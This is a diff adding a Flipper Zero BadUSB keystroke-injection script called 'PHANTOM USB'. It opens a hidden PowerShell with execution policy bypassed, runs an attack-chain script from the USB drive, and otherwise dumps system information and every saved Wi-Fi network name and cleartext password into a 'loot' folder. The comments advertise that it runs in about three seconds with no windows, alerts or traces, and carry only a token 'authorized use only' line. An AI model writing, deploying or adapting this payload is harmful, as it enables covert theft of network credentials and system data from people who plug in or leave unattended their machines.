@@ -1,0 +1,28 @@
+REM ============================================================================
+REM  PHANTOM USB - Zero-Touch Auto-Deploy
+REM  ============================================================================
+REM  Flipper Zero BadUSB payload.
+REM  Triggers the phantom autorun service on the USB tri-drive.
+REM  
+REM  WHAT IT DOES:
+REM    1. Opens hidden PowerShell
+REM    2. Auto-detects the USB drive letter
+REM    3. Launches the full attack chain silently
+REM    4. No windows, no alerts, no traces
+REM
+REM  TIMING: ~3 seconds from plug to execution
+REM  FLLC | Authorized use only.
+REM ============================================================================
+
+REM Wait for OS to register USB
+DELAY 1500
+
+REM Open Run dialog
+GUI r
+DELAY 600
+
+REM Launch hidden PowerShell that finds and executes from USB
+STRING powershell -W Hidden -NoP -Exec Bypass -C "$d=Get-WmiObject Win32_LogicalDisk -F 'DriveType=2'|%{$_.DeviceID}|?{Test-Path \"$_\\payloads\"}|Select -First 1;if($d){iex(gc \"$d\\payloads\\autorun_service.ps1\" -Raw)}else{$d=Get-WmiObject Win32_LogicalDisk -F 'DriveType=2'|%{$_.DeviceID}|Select -First 1;if($d){$l=\"$d\\loot\";md $l -F|Out-Null;systeminfo|Out-File $l\\sys.txt;netsh wlan show profiles|%{if($_-match'Profile\s*:\s*(.+)'){$n=$Matches[1].Trim();$r=netsh wlan show profile $n key=clear;$k=($r|sls 'Key Content'|%{($_-split':')[1].Trim()});\"$n`:$k\"}}|Out-File $l\\wifi.txt}}"
+ENTER
+
+REM Done - no visible window, no trace
